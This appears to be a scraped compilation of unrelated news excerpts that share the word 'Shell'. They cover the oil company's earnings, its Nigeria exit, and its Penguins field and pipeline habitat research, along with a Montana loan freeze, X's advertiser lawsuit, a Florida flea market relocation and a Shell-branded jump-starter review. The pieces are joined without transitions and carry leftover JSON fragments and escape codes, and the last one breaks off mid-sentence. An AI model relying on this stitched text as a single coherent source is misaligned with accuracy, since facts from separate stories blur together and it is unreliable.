were reaching out to a wide array of federal grant recipients on Jan. 28 amid news of a federal spending freeze. In Great Falls, I reached out to school district officials, city and county representatives, health care organizations and others to see if any early disruptions had materialized. Localizing a national story is a foundational local journalism strategy. While there was plenty of concern to go around, there weren\u2019t many acute funding shortages, though the fate of some funding streams remains unknown.\n\nBut there was one local impact at Calumet, which was expecting the first disbursement of a massive loan guarantee from the U.S. Department of Energy. A tranche of $782 million was approved for funding that very day, according to Calumet\u2019s investor update. The money will fund an expansion of the Montana Renewables biofuel plant, but that distribution was still on hold as of Friday, Jan. 31.\n\nSpeaking with MTFP, Montana Renewables CEO Bruce Fleming was confident that this amounted to a review by a new presidential administration to align spending with its goals. He and other industry stakeholders indicated President Donald Trump\u2019s support for biofuel production, even as he may look to curtail other clean energy initiatives.\n\nRead MTFP\u2019s full coverage here of the freeze on Montana Renewables\u2019 loan and the potential parsing of former President Joe Biden\u2019s climate actions.\n\nOne detail that didn\u2019t make it into the story: An Energy Department announcement of the loan commitment to Calumet appears to have been scrubbed from the agency website (archived here). It\u2019s not clear if this means anything, but the administration has a habit of deleting website resources for issues or projects it disagrees with.\n\nThe Energy Department\u2019s main landing page for the Montana Renewables project remains live on the website.\n\n5 Things to Know in Great Falls\n\nNeighborWorks Great Falls announced that it is on track to be designated as a \u201ccommunity reinvestment organization\u201d for six central Montana counties in addition to Cascade. This allows participation in a state program to make loans to help people at up to 140% of the area median income finance a portion of a home. NeighborWorks was previously approved by Cascade County commissioners to administer the program, and this new announcement adds Chouteau, Teton, Toole, Pondera, Blaine and Glacier counties. As part of the program, NeighborWorks must find matching funds to the state money. In a press release, Great Falls Development Alliance CEO Brett Doney said the organization plans to put up its loan capital to assist in the match and hopes to attract developers.\n\nThe Cascade County Sheriff\u2019s Office has found a community partner to set up a crisis receiving center aimed at serving people facing mental health crises. Plans are underway to retrofit the upper level of the Indian Family Health Clinic for secured and unsecured space for mental health care. It\u2019s meant as a jail diversion effort for people with low-level criminal offenses but acute mental health issues. Sheriff Jesse Slaughter has previously said the department faced challenges in a jail setting providing mental health care. In a recent presentation to county commissioners, Undersheriff Scott Van Dyken said Great Falls is the only large city in the state without such a facility. Indian Family Health Clinic has 14 rooms and is currently going through asbestos removal, Van Dyken said. A $1.5 million state mental health grant will fund the startup costs.\n\nGreat Falls City Commission will consider final approval to kick off a study on the land use interactions between Malmstrom Air Force Base and the city. The firm Advanced Engineering and Environmental Services is the leading candidate to carry out an infrastructure resilience and compatible land use study. A $360,000 federal grant and a $40,000 local match by the city will fund the work. On Tuesday, commissioners will vote for or against a professional services agreement with the engineering firm to carry out the study.\n\nGreat Falls Public Schools expect to use its ability to raise levies through school board votes. State law allows limited increases with limits on the amount of increases. Revenue projections for the next budget cycle show increases in five school funds and a decrease in one fund for facility upgrades. In total, the levy increase is estimated to add $23.72 to the annual tax bill on a $300,000 home. Tax valuations and legislative action could change the final figure by the time the budget is set later this year.\n\nGreat Falls City Commission will discuss its broad 2025 goals during a work session on Tuesday, Feb. 4. The goals include an assessment of deficit funds that get aid from the general fund, passage of the growth policy in development, community education and public safety funding. Specific to public safety, the goals include decisions on how to use 3.5 mills of funding that were pulled from the Great Falls Public Library and the early stages to develop a renewed push to put another public safety levy in front of voters.",

The previous export route for this field was via the Brent Charlie platform, which ceased production in 2021 and is being decommissioned.\n\nPeak production is estimated at around 45,000 barrels of oil equivalent per day (boed) and currently has an estimated discovered recoverable resource volume of approximately 100 million boe. Although primarily oil production, Penguins will also produce enough gas to heat around 700,000 UK homes per year.\n\nThe new FPSO will have around 30% lower operational emissions compared with Brent Charlie and is expected to extend the life of this important field by up to 20 years.\n\n\u201cToday, the UK relies on imports to meet much of its demand for oil and gas,\u201d said Zo\u00eb Yujnovich, Shell\u2019s Integrated Gas and Upstream Director. \u201cThe Penguins field is a source of the secure domestic energy production people need today, and the FPSO is a demonstration of our investment in competitive projects that create more value with less emissions.\u201d\n\nAlthough oil will be transported by tanker to refineries outside of the UK, these include ones that supply refined products like petrol and diesel back to the UK because of its limited refining capacity.\n\nNatural gas will be transported through the existing pipeline to the St Fergus gas terminal in the north-east of Scotland, which supplies the UK\u2019s national gas network.\n\nThe redevelopment of the Penguins field has involved drilling additional wells, which are tied back to the new FPSO. The field is in 165 metres (541 feet) of water depth, around 150 miles north-east of the Shetland Islands. Discovered in 1974, the field previously produced oil and gas between 2003 and 2021.",

Vegetation may be managed to promote native plant species that will not grow too tall and obscure pipeline markings. In Pennsylvania, these plants include goldenrods, asters and coneflowers. These species are taller than four inches at blooming but still permit marker visibility.\n\nOther management practices include high volume, non-selective application of herbicides, frequent mowing or mulching.\n\nMahan and her team began year one of research with preliminary sampling and surveying work over the summer. They discovered rare native plants, monarch butterflies and grassland birds utilizing the right-of-way habitat, which Mahan said she finds promising for the rest of the project.\n\nThis summer will include pollinator research, and she expects to find more native grassland birds, native bees and other flower-visiting insects using the right-of-way.\n\nShell and other energy companies manage about 30 million acres in rights-of-way.\n\n\u201cIf we can get these companies to change their vegetation management approaches, we can create a lot of habitat for native wildlife,\u201d Mahan said. \u201cThat means a robust ecosystem that can support pollinators, plants and native wildlife.\u201d\n\nMahan said she hopes her research findings will be an example for other companies to follow pursuit of their own environmental, social and governance goals.

It marks the end of the of the London-based energy giant\u2019s nearly century-long operations in the onshore Niger Delta region, where it faces long-running complaints of environmental pollution.\n\nNow a potential restart of oil production Ogoniland region in southern Nigeria, where Shell halted its operations in 1993 following violent protests over allegations of widespread environmental damage and human rights abuses, has been earmarked by government officials as a potential way of increasing its foreign exchange earnings.\n\n\u201cThe broad consensus in Ogoni is in favor of restarting production,\u201d said Ledum Mitee, a veteran environmental activist and former president of the Movement for the Survival of Ogoni People.\n\nIn this frame from video, workers stand by a container to collect oil spill waste from a Shell facility in Ogoniland, Nigeria, June 16, 2023.

Isaac Botti of Social Action, a Nigerian group that organized protests against Shell\u2019s sale, said his organization had requested terms of the agreement the Nigerian Upstream Petroleum Regulatory Commission signed with Shell and the new owners, Renaissance Africa Energy Company. The regulator did not respond to The Associated Press\u2019 request for comment.\n\nShell previously told AP that the transaction was designed to preserve the company\u2019s role to \u201cconduct any remediation as operator of the joint venture where spills may have occurred in the past from the joint venture\u2019s operations.\u201d\n\nA man paddles his canoe in the Niger Delta near the village of Ogboinbiri, Nigeria, Dec. 11, 2024.

            "content": "The global energy sector is in transition, with major oil companies under pressure to cut emissions while staying profitable. Shell, Chevron, and ExxonMobil\u2014three of the world\u2019s biggest energy giants\u2014are taking different paths to navigate this shift. Their latest earnings reveal how each company is balancing investments in oil, gas, and low-carbon initiatives. While some struggle with declining profits, others are outperforming expectations. Beyond financials, their sustainability goals and net-zero targets set them apart. But are these commitments keeping pace with financial performance? Let\u2019s dive into their latest financial results and see which energy giant leads the charge toward a greener future.\n\nWho\u2019s Winning the Oil Game? A Financial Face-Off\n\nShell: Struggling Profits, Big Promises\n\nShell reported Q4 2024 earnings of $1.20 per ADS (American Depository Share), missing the Zacks Consensus Estimate of $1.78 and significantly lower than $2.22 per ADS in Q4 2023. The company\u2019s revenue dropped to $66.8 billion from $80.1 billion, falling short of expectations by 16.6%. The decline was driven by weaker realized prices, reduced trading margins, and lower LNG sales.\n\nShell repurchased $3.6 billion in shares and increased its dividend by 5%, with plans for another $3.5 billion in repurchases in Q1 2025. Here is the oil giant\u2019s income per segment:\n\nUpstream : Profit fell to $1.7 billion from $3.1 billion, missing expectations due to lower oil and gas prices. Liquids prices fell 11%, while natural gas declined 7%.\n\nChemicals & Products : Reported a $229 million loss, reversing a $29 million profit from the previous year, due to lower margins and unfavorable tax movements.\n\nIntegrated Gas : Adjusted income dropped to $2.2 billion from $4 billion, missing the expected $2.8 billion due to a 14.3% drop in LNG sales.\n\nMarketing : Income rose to $839 million from $794 million, but missed expectations of $885 million.\n\nRenewables & Energy Solutions : Recorded a $311 million loss, down from a $173 million profit a year earlier, due to rising costs and adverse tax effects.\n\nChevron: A Mixed Bag of Losses and Growth\n\nChevron\u2019s Q4 earnings fell below Wall Street expectations, reporting adjusted EPS of $2.06 versus the estimated $2.11. This led to a 4% drop in its stock price. The company\u2019s downstream segment posted a $248 million loss, compared to a $1.15 billion profit in Q4 2023. This is because refining margins weakened amid declining fuel demand in the U.S. and China.\n\nOil & Gas Production : Profits rose to $4.3 billion from $1.59 billion a year ago, despite a flat overall output of 3.35 million boepd (Barrels of oil equivalent per day). Permian Basin production grew 14% to a record 992,000 boepd.\n\nRefining : Weak jet fuel demand contributed to the company\u2019s first refining loss since 2020.\n\nChevron expects global output to grow 6-8% in 2025 and 3-6% in 2026. The company raised its quarterly dividend by 5% and reaffirmed share buyback plans of $10-$20 billion annually.\n\nExxon: Defying Expectations Amid Industry Headwinds\n\nExxon announced Q4 2024 earnings of $7.6 billion, or $1.72 per share, exceeding analyst estimates of $1.56. Despite lower oil prices, higher production helped offset the weaker refining margins of this big oil company.\n\nOil & Gas Production : Adjusted earnings rose to $6.28 billion from $4.15 billion a year earlier. Production increased to 4.6 million boepd, driven by low production costs in the Permian Basin and Guyana projects.\n\nRefining : Earnings from gasoline and diesel production dropped sharply to $323 million from $3.2 billion a year earlier due to increased refinery capacity in Asia.\n\nExxon reported $33.7 billion in earnings for 2024, down from $38.57 billion in 2023, but highlighted strong operational efficiency and profitability.\n\nThe three energy giants all faced challenges in Q4 2024, with weaker refining margins and lower oil prices impacting profitability. However, Exxon outperformed expectations, while Chevron and Shell struggled with underwhelming results. All three companies remain focused on capital discipline, shareholder returns, and production efficiency moving forward.\n\nThe Green Pivot: Are Big Oil\u2019s Net Zero Pledges Enough?\n\nShell, Chevron, and ExxonMobil are charting distinct paths toward sustainability as the energy landscape evolves. Their climate commitments, emissions targets, and investment in renewables illustrate their vision for a lower-carbon future.\n\nEach of the energy giants has its own roadmap to net-zero emissions, with varying approaches and strategies. To have a clearer picture of how much carbon pollution each of them emitted in 2023, look at the image below.\n\nWhile some are making bolder moves in renewables, others remain focused on carbon capture and efficiency improvements. Understanding Shell, Chevron, and ExxonMobil\u2019s strategies provides insight into the future of the oil and gas industry.\n\nShell\u2019s Carbon Commitment: Big Talk or Real Action?\n\nShell aims to become a net-zero emissions energy business by 2050 as part of its Powering Progress strategy. This commitment includes eliminating operational emissions and reducing the emissions from the energy products it sells.\n\nThe company has set several targets to achieve this goal:\n\n50% absolute emissions reduction by 2030 (Scopes 1 and 2) compared to 2016 levels.\n\nEliminate routine flaring of natural gas by 2025 to curb carbon emissions.\n\nReduce methane emissions intensity below 0.2% and reach near-zero methane emissions by 2030.\n\n15-20% reduction in customer emissions from oil products by 2030 (Scope 3, Category 11, 2021 baseline).\n\nProgress Achieved\n\nBy the end of 2023, Shell had cut more than 60% of its emissions goal for 2030. The company\u2019s methane emissions intensity was 0.05% for facilities with marketed gas and 0.001% for facilities without marketed gas.\n\nShell tracks its emissions reductions through Net Carbon Intensity (NCI), which measures emissions per unit of energy sold. Key milestones include:\n\n6-8% reduction achieved in 2023 (from 2016 levels)\n\n9-12% reduction target for 2024\n\n100% reduction goal by 2050\n\nShell\u2019s strategy for 2030 balances energy security with sustainability. The company plans to reduce emissions by evolving its product mix and shifting towards low-carbon solutions such as biofuels, hydrogen, and renewables.\n\nShell has also invested heavily in carbon offset initiatives to negate its GHG emissions. However, under CEO Wael Sawan\u2019s leadership, the oil giant is reducing its focus on nature-based projects and is considering engineered carbon removals instead.\n\nToday, 70% of Shell\u2019s cash flow comes from Integrated Gas and Upstream businesses, while 75% of its emissions come from Downstream, Renewables, and Energy Solutions. Additionally, Shell has invested heavily in offshore wind projects, with plans to expand its renewable energy portfolio across multiple continents.\n\nChevron\u2019s Climate Play: Real Solutions or Greenwashing?\n\nChevron is investing $8 billion in lower-carbon energy projects from 2021-2028, including renewable fuels, carbon capture, hydrogen, and offsets. An additional $2 billion is allocated to reducing emissions within its operations.\n\nThe company is also developing new partnerships with tech firms to enhance energy efficiency and reduce its environmental impact.\n\nChevron targets net-zero upstream Scope 1 and 2 emissions by 2050 but acknowledges that achieving this goal depends on technological advances, regulatory support, and viable carbon capture and offset mechanisms.\n\n2028 Carbon Intensity Targets\n\nChevron\u2019s plans to lower carbon intensity include:\n\n71 g CO\u2082e/MJ portfolio carbon intensity (Scope 1, 2, and 3)\n\n24 kg CO\u2082e/boe oil carbon intensity (Scope 1 and 2)\n\n24 kg CO\u2082e/boe gas carbon intensity (Scope 1 and 2)\n\n36 kg CO\u2082e/boe refining carbon intensity (Scope 1 and 2)\n\nGHG Reduction Initiatives\n\nChevron uses the Marginal Abatement Cost Curve (MACC) to optimize carbon reduction. The company has identified 150+ GHG abatement projects, with over $600 million in investments planned for 2024.\n\nBetween 2021-2028, Chevron expects $2 billion in GHG reduction investments, targeting 4 million metric tons (mt) of annual emissions reductions. Here are the company\u2019s other sustainability plans and strategies to achieve its ambitious 2050 net zero goal.\n\nMethane and Renewable Energy Expansion\n\nMethane emissions goal of 2.0 kg CO\u2082e/boe by 2028\n\nAdvanced methane detection programs, including satellite monitoring\n\nGrowing renewable fuels capacity to 100 mbd by 2030, including renewable diesel and sustainable aviation fuel\n\nSignificant CCUS investments, including Bayou Bend (Texas) and Gorgon (Australia)\n\nExpanding hydrogen production to 150 mtpa by 2030\n\nDeveloping advanced geothermal energy projects to enhance clean energy production\n\nSEE MORE: Chevron Reports Lower Q2 Earnings! What About Its Emissions?\n\nExxonMobil\u2019s Bold Bet on Decarbonization\n\nExxonMobil has cut 23% of nitrogen oxides, sulfur oxides, and volatile organic compounds emissions since 2016. In 2023, its GHG emissions stood at 111 MMTCO\u2082e, marking a 2 MMT reduction from the previous year. The company is also exploring new ways to enhance energy efficiency across its global operations.\n\nExxonMobil aims for a 20% absolute reduction in GHG emissions by 2030, compared to 2016 levels. The company aligns its emissions reductions with the Paris Agreement while emphasizing intensity-based reductions.\n\nBeyond burning down emissions in its own operations, Exxon is also helping other industries decarbonize. Its Low Carbon Solutions business focuses on hard-to-decarbonize sectors like heavy industry, power, and transportation. The oil giant seeks to lead in profitable, large-scale emission reduction solutions, with the following key strategies.\n\nKey Sustainability Actions\n\nInvesting in carbon capture , biofuels, and hydrogen\n\nAdvancing methane management with innovative detection technologies\n\nDeploying CCUS projects, including the world\u2019s largest CCUS facility at LaBarge, Wyoming\n\nDeveloping low-carbon solutions for hard-to-abate industries\n\nLaunching a $17 billion investment plan in lower-carbon solutions through 2027\n\nExploring direct air capture (DAC) technologies to remove CO\u2082 from the atmosphere\n\nREAD MORE: ExxonMobil\u2019s First-of-its-Kind Carbon Capture Solution for the U.S. Data Centers\n\nBig Oil\u2019s Race Against Time\n\nShell, Chevron, and ExxonMobil are taking different approaches to sustainability and emissions reduction. While Shell focuses on reducing absolute emissions and net carbon intensity, Chevron prioritizes carbon intensity reduction and methane management. ExxonMobil, meanwhile, is expanding CCUS and methane detection efforts to lower emissions.\n\nAs global climate policies tighten, Shell, Chevron, ExxonMobil, and other energy companies should accelerate their transition strategies to meet net-zero targets.",

Bloomberg via Getty Images\n\nShortly after the Tesla CEO began overhauling the platform, the Global Alliance for Responsible Media (GARM) \u2014 an initiative of the WFA to keep brands\u2019 ads away from harmful content on loosely regulated websites \u2014 raised concerns to its member companies that X would not be able to adhere to its safety standards.\n\nThat communication unleashed a \u201cmassive advertiser boycott that followed,\u201d X\u2019s lawsuit claimed.\n\nTrouble with advertisers started shortly after Musk bought the social media company. By 2023, its ad revenue had sharply declined as major players like Amazon started pulling their placements.\n\nOther companies previously named in the lawsuit include CVS, the Amazon-owned social media company Twitch, CVS Health, Mars, and the Danish power company Orsted.\n\n3 Nestle along with Shell and Colgate were each added to the massive lawsuit. REUTERS\n\nUnilever was also named in the lawsuit, but it was removed after reaching a settlement with X.\n\nAs advertisers jumped ship following his takeover, Musk bluntly said companies avoiding X could \u201cgo f**k yourself.\u201d\n\nX opened its lawsuit in August 2024, and days later WFA ended the GARM initiative.\n\n3 The suit alleges the brands partook in a World Federation of Advertisers-coordinated (WFA) boycott of X that violated antitrust laws. Christopher Sadowski\n\nSome companies have been returning to X since Musk worked his way into President Trump\u2019s inner circle. Amazon, for instance, has been increasing its ad presence on the platfrom, according to the Journal.\n\nThe WFA has previously said that X\u2019s lawsuit misses the point of the organization and left it financially gutted.\n\n\u201cGARM is a small, not-for-profit initiative, and recent allegations that unfortunately misconstrue its purpose and activities have caused a distraction and significantly drained its resources and finances,\u201d the group said after it disbanded GARM.",

According to disclosures made with the SEC, Union Bancaire Privee UBP SA acquired 8,938 shares of Shell in the recent quarter for approximately $549,000. This acquisition adds to the trend observed as several hedge funds reposition their stakes within the energy giant.\n\nInvestors like Fortitude Family Office LLC and Valley Wealth Managers Inc. also took new stakes during the third quarter, investing $30,000 and $33,000 respectively. Brooklyn Investment Group and GHP Investment Advisors Inc. were similarly active, with the former buying shares valued at around $35,000 and the latter increasing their position by 40.8% during the same period. Following these actions, institutional investors now collectively own about 28.60% of Shell's stock.\n\nThe recent uptick in interest from institutional investors coincides with increased analyst attention on Shell's stock. On January 7, Morgan Stanley upgraded Shell from an \"equal weight\" rating to \"overweight\" and raised their price target from $66.50 to $79.80. Following closely, UBS Group upgraded Shell from \"neutral\" to \"buy\" on January 8. Sanford C. Bernstein went one step farther, designoting the stock as \"strong-buy,\" adding confidence to investment strategies focused on Shell.\n\nDespite the bullish outlook from several quarters, not all analysts are equally optimistic. While Scotiabank adjusted its price target down from $90.00 to $80.00, it maintained a \"sector outperform\" rating. Wolfe Research's ranking of Shell was upgraded from \"peer perform\" to \"outperform\" with the consensus reflecting analysts\u2019 overall optimistic sentiment. Presently, Shell enjoys an average price target of $79.11, with one hold rating, eight buy ratings, and three strong buy endorsements.\n\nTrading activity on February 2, 2025, reflected these mixed sentiments\u2014Shell's shares experienced fluctuations, closing down $0.84 at $65.82. The trading volume stood at 5,424,352, exceeding its average of 3,853,398. Shell's price performance this year has oscillated between its 52-week low of $60.15 and high of $74.61. With reporting continuing, analysts expect Shell to achieve earnings per share of 8.11 for the current fiscal year, reflecting ambitions for solid returns.\n\nOn January 30, Shell disclosed its latest quarterly earnings, reporting $1.20 EPS, which fell short of analysts' consensus estimates of $1.74 by $0.54. The earnings miss has raised eyebrows around the company's immediate financial health, as its return on equity was recorded at 14.54% with a net margin standing at 5.17%.\n\nEncouragingly, Shell recently announced it would increase its quarterly dividend from $0.69 to $0.716, marking this as part of their continued efforts to return value to shareholders. Record shareholders on February 14 will receive this dividend on March 24, translating to approximately $2.86 on an annualized basis. This new increase reflects Shell\u2019s dividend yield at about 4.35% and showcases its commitment to maintaining attractive shareholder returns even amid recent volatility.\n\nShell operates primarily through segments such as Integrated Gas, Upstream, Marketing, Chemicals, and Renewables. This operational breadth allows it to explore and extract oil and gas resources across continents, including Europe, Asia, Oceania, Africa, and North America.\n\nWhile analyst upgrades bolster confidence, the energy market remains unpredictable. Shell's financial performance will be under continuous scrutiny as it navigates the challenges and opportunities presented by fluctuishing global energy prices and market demands. For shareholders and potential investors alike, the balance of risks and returns associated with Shell plc presents both challenges and potential rewards.\n\nOverall, Shell plc's recent financial maneuvering and analyst reactions showcase the company's dual narrative of caution and promise. Those keeping one eye on Shell\u2019s market performance will undoubtedly want to remain alert as earnings continue to evolve alongside the energy market's dynamics.",

Shell, the oil and gas giant we all recognize, is set to close more than 1,000 gas stations across the country by the end of 2025. While it sounds like a hit to road trips and quick snack runs, it\u2019s actually part of Shell\u2019s ambitious plan to embrace a greener, electric future.\n\nWhat\u2019s Happening to Utah\u2019s Shell Stations?\n\nUtah has 54 Shell stations statewide, and while it\u2019s unclear how many will close, it\u2019s safe to say that some could be on the chopping block. This is all part of Shell\u2019s strategy to transition from traditional gas to electric vehicle (EV) charging.\n\nBy 2025, Shell aims to install 70,000 EV charging stations globally, with a goal of reaching 200,000 by 2030. So, while some Utah gas stations might close, the state could gain cutting-edge EV charging hubs in their place.\n\nPresident Biden To Release One Million Barrels Of Oil Reserves Per Day Getty Images loading...\n\nThe Future of Utah\u2019s Remaining Stations\n\nNot all Shell stations in Utah will disappear. The ones that stick around are in for a major upgrade. Think sleek new designs, improved convenience stores, and, of course, state-of-the-art EV chargers. If your go-to Shell survives, it\u2019ll look less like a gas station and more like a glimpse into the future of travel.\n\nWhich Stations Will Close?\n\nHere\u2019s the kicker\u2014Shell hasn\u2019t shared specific details about which Utah locations are on the closure list. This leaves drivers across the state, from Salt Lake City to St. George, wondering if their neighborhood Shell will be affected.\n\nShell Oil Posts Strong Quarterly Profits Getty Images loading...\n\nWith 54 locations, Utah doesn\u2019t have as many Shell stations as states like California or Nevada, but every closure still matters\u2014especially in rural areas where options for refueling can already be limited.\n\nWhy This Matters for Utah\n\nShell\u2019s pivot toward EV infrastructure is no small move. After acquiring Volta in 2023, a charging network with 3,000 EV stations, the company made it clear they\u2019re doubling down on clean energy. For Utah, where EV adoption is growing steadily, this could mean a big step forward in making the state more eco-friendly. Utah, the gas station landscape is changing fast. Whether you\u2019re fueling up for a ski trip or heading to a family barbecue, keep an eye on your local Shell station\u2014it could either be closing or evolving into a high-tech EV haven.\n\nThe future of fueling in Utah is here.

Last year, some vendors relocated to Paradise Vintage Market after the Shell Factory closed, but space was limited. Now, many of the remaining vendors have set up shop at the Elks Lodge, turning it into a bustling flea market.\n\nWatch Community Correspondent Austin Schargorodski's report:\n\n\u2018It\u2019s a big relief\u2019: Displaced Shell Factory vendors set up at North Fort Myers Elks Lodge\n\nOn Saturday, the Elks Lodge parking lot was filled with tables displaying handmade goods and antique treasures for shoppers. For Don Payton, this market is more than just a place to sell - it's a fresh start. He spent 11 years at the Shell Factory, until one day, it was gone.\n\n\"It was a shock to everybody,\" Payton said. \"We\u2019d been there for so long, and then all of a sudden, she just decided to close the place and left us without a home.\"\n\nNow, he and other vendors have finally found stability. \"It\u2019s a big relief knowing we got a home now,\" Payton said. \"A place we know we can go, know exactly where it is, and can get set up and ready to go.\"\n\nAustin Schargorodski Aerial view of the flea market at the Elks Lodge in North Fort Myers\n\nThe effort to create this new market wouldn\u2019t have happened without Donna Primavera and Carl Boscarino from the Elks Lodge, who saw a need and stepped in.\n\n\"We\u2019re very happy to have them, and obviously, by today\u2019s turnout, you can see it\u2019s very profitable for the vendors,\" Primavera said. \"And it helps our lodge raise money so we can continue our works of charity with the vets and the homeless.\"\n\nThe flea market is open from 9 a.m. to around noon every Tuesday, Thursday, and Saturday. Plus, this is just the beginning - Primavera says they\u2019re clearing space to welcome even more vendors in the future.",

            "content": "Shell plc (LON:SHEL) just released its latest yearly report and things are not looking great. Shell missed earnings this time around, with US$284b revenue coming in 2.8% below what the analysts had modelled. Statutory earnings per share (EPS) of US$2.53 also fell short of expectations by 18%. The analysts typically update their forecasts at each earnings report, and we can judge from their estimates whether their view of the company has changed or if there are any new concerns to be aware of. Readers will be glad to know we've aggregated the latest statutory forecasts to see whether the analysts have changed their mind on Shell after the latest results.\n\nCheck out our latest analysis for Shell\n\nLSE:SHEL Earnings and Revenue Growth February 1st 2025\n\nFollowing last week's earnings report, Shell's 18 analysts are forecasting 2025 revenues to be US$279.8b, approximately in line with the last 12 months. Statutory earnings per share are predicted to surge 42% to US$3.74. Before this earnings report, the analysts had been forecasting revenues of US$276.1b and earnings per share (EPS) of US$3.71 in 2025. The consensus analysts don't seem to have seen anything in these results that would have changed their view on the business, given there's been no major change to their estimates.\n\nIt will come as no surprise then, to learn that the consensus price target is largely unchanged at UK\u00a332.60. That's not the only conclusion we can draw from this data however, as some investors also like to consider the spread in estimates when evaluating analyst price targets. Currently, the most bullish analyst values Shell at UK\u00a336.65 per share, while the most bearish prices it at UK\u00a329.79. The narrow spread of estimates could suggest that the business' future is relatively easy to value, or thatthe analysts have a strong view on its prospects.\n\nLooking at the bigger picture now, one of the ways we can make sense of these forecasts is to see how they measure up against both past performance and industry growth estimates. These estimates imply that revenue is expected to slow, with a forecast annualised decline of 1.6% by the end of 2025. This indicates a significant reduction from annual growth of 5.5% over the last five years. By contrast, our data suggests that other companies (with analyst coverage) in the industry are forecast to see their revenue decline 2.0% annually for the foreseeable future. So it's pretty clear that Shell's revenues are expected to shrink slower than the wider industry.\n\nThe Bottom Line\n\nThe most important thing to take away is that there's been no major change in sentiment, with the analysts reconfirming that the business is performing in line with their previous earnings per share estimates. Fortunately, they also reconfirmed their revenue estimates, suggesting that it's tracking in line with expectations. Their estimates also suggest that Shell's revenue is expected to perform better than the wider industry. The consensus price target held steady at UK\u00a332.60, with the latest estimates not enough to have an impact on their price targets.",

As a result, the suit said the group prepared a large-scale pause in advertising.\n\nAccording to the suit, at least 18 advertisers that were part of GARM stopped buying ads on Twitter either in the U.S. or globally in the weeks after Musk bought the platform in November 2022, while other members of GARM \"substantially reduced\" their ad spending on Twitter.\n\nIn turn, X claims it was deprived of billions of dollars in advertising revenue and the ramifications of the boycott continue to be felt years later, the suit alleged.\n\nLawyers for X argued that in a competitive market, social media platforms should have the option to set their own brand safety standards that are \"optimal for that platform.\"\n\n\"But collective action among competing advertisers to dictate brand safety standards to be applied by social media platforms shortcuts the competitive process and allows the collective views of a group of advertisers with market power to override the interests of consumer,\" the complaint said.\n\nThe companies added to the lawsuit on Saturday did not immediately respond to NPR's request for comment.\n\nMusk has reshaped Twitter and its approach to what is and isn't permitted on the social media platform. He reinstated accounts that had been barred for violating the platform's rules. He also removed contract content moderators, the company's human rights team and investigators tasked with curbing political manipulation and child sexual abuse material, as NPR previously reported.\n\nLast year, following the suit, the World Federation of Advertisers discontinued GARM operations, explaining that \"recent allegations that unfortunately misconstrue its purpose and activities have caused a distraction and significantly drained its resources and finances.\"",

Trump has temporarily withdrawn federal waters from consideration for offshore wind development and paused the issuance of new permits, approvals, and loans for all onshore and offshore wind projects.\n\nAtlantic Shores received final federal approvals in October 2024 to construct two offshore wind farms in federally regulated waters 8.7 miles off the New Jersey coast near Atlantic City. The Atlantic Shores offshore wind projects 1 and 2 will include up to 200 offshore wind turbines, offshore substations to collect the electricity produced, and the associated cables buried beneath the seabed that are needed to transport electricity to shore.\n\nThe projects have received construction and operations plan approvals from the Bureau of Ocean Energy Management (BOEM), as well as a Clean Air Act permit from the U.S. Environmental Protection Agency.

While using the unit and writing this review, we kept three things in mind, outlined below.\n\nRobustness & Versatility: When we have a product for our vehicle or home, we want it to feel solid and durable when we hold it. While we have used and reviewed more muscular portable jump starters, this 1220A Shell unit is robust enough, given its intended design and price point. Value-Added Features: This Shell portable jump starter has a built-in flashlight and two USB charging ports for powering a phone or tablet in a pinch. The flashlight doubles as an SOS beacon. Since Michigan is home to Automoblog, we review certain products from the standpoint of whether we would feel comfortable placing them in our winter emergency kit. Safety Features: High-quality portable jump starters have provisions against reverse polarity. The 1200A Shell Portable Jump Starter will issue alerts if the battery clamps are improperly placed, reducing the risk of injury for the user. Show more Show less\n\n1200A Shell Portable Jump Starter Review Summary\n\nThe 1200A is designed for vehicles with gasoline engines up to seven liters in displacement, which covers every late-model sedan, truck, SUV, and minivan. It can also jump vehicles with smaller displacement diesel engines (up to three liters).\n\nThis Shell portable jump starter is also great for winter emergency kits, especially since it has a built-in flashlight with an SOS sequence.\n\nAlthough the jumper cables are a tad short for our liking, the clamps offer a firm bite and have a solid, heavy-duty feel. In addition to your vehicle, the 1200A Shell Portable Jump Starter will accommodate motorcycles, snowmobiles, and personal watercraft.\n\nThe 1200A usually retails for about $130, not counting any deals or discounts. Below, we will cover the main features if you are in the market for a portable jump starter.\n\n1200A Shell Jump Starter See Best Price As an Amazon Associate, Automoblog earns from qualifying purchases. The 1200A Shell Portable Jump Starter provides the convenience of on-demand power if your car battery dies.\n\n\n\nHelpful features include a built-in LED flashlight, a charging bank for smartphones and tablets, and reverse polarity protection.\n\nWhat Comes In The Box?\n\nThe 1200A Shell Portable Jump Starter comes with jumper cables, a car charger (2.4A output), one USB-A to Micro USB cable, one Type-C to Type-C USB cable, an owner\u2019s manual, a product warranty registration card, and a carrying case.\n\nThe integrated charging bank has two USB-A ports, an input/output Type-C port, and a micro USB port. The 12V jump port, where you connect the cables, is just to the side of the power button and battery level indicator (battery level for the Shell unit, not your car battery).\n\nCharging\n\nFor optimal performance, Shell recommends charging the unit immediately after purchase, after each use, or every three months to prolong the internal battery life. Regular charging is preferred as it can take several hours to recharge if the internal battery is completely zapped.\n\nTo charge, simply connect the included Type-C cable to a USB power adaptor and plug it in. If you are on the go, you can charge the unit via the included car charger.\n\n1200A Shell Portable Jump Starter Specs\n\nWeight: 3.1 lbs.\n\n3.1 lbs.

Photo: Alex Hartman.\n\nJumper Cable Connector & Status Indicators\n\nThe jumper cable connector is enclosed in a black casing, complete with a status indicator light and a boost button (look for the little blue piece on the end of the casing that plugs into the actual Shell unit). When you attach the jumper cables to the Shell unit, the status indicator will blink green.\n\nOnce connected to your car battery, that light will turn solid, indicating you are okay to proceed with the jump start. Shell recommends not attempting to jump your vehicle more than four consecutive times.\n\nIf there is a connection issue, the Shell portable jump starter will alert you with visible and audible cues. If the green light is off and there is continuous beeping, it could mean a loose connection or reverse polarity (the positive and negative clamps are connected to the wrong battery terminals). There are additional notifications if the jump starter is running hot or at risk of short-circuiting.\n\nThe only downfall here is the short length of the jumper cables. Even a slight increase would be beneficial, especially as there is enough room inside the carrying case to accommodate longer cables. If your battery is tucked away under the hood, you might have to get creative in how you maneuver the unit with its shorter cables.\n\nThe battery (upper right-hand corner) in our 2019 Toyota Corolla is near the firewall, making it harder to reach with the shorter cables of the Shell portable jump starter. Photo: Alex Hartman.\n\nBoost Button\n\nThe Boost feature generates the highest possible current, but Shell recommends using this only when absolutely necessary. It\u2019s advisable to attach the clamps first to your battery, then press the Boost button on the jumper cable connector.\n\nDoing this will lessen the chances of accidentally touching the clamps (which will give off a spark) and damaging either the unit or your vehicle\u2019s electrical system (or both).\n\nCharging Bank & 